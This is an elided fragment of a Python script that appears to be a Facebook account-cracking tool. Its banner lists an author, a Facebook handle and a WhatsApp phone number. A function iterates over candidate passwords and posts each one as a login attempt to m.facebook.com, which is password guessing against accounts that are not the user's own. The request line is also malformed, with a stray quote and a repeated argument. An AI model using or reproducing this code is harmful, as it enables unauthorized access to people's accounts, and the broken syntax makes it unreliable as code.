...
def banner():
  ...
  \033[91;1m  ╔════════════════════════════════════════╗
   {H} ║{P}[{H}•{P}] Author    :{warna} ARIYAN SABBIR                 {N}{H}║
  {H}  ║{P}[{H}•{P}] Facebook  : {H}Ariyan Sabbir             {N}{H}║
    {H}║{P}[{H}•{P}] Whatsapp  : {M}+8801568579466          {N}{H}║
...
def m3(idf,pw):
 ...
 try:
  for ps in pw:
   ...
   lo = session.post('https://m.facebook.com/', cookies=cookies, headers=headers',data=log_data,headers=header_freefb).text
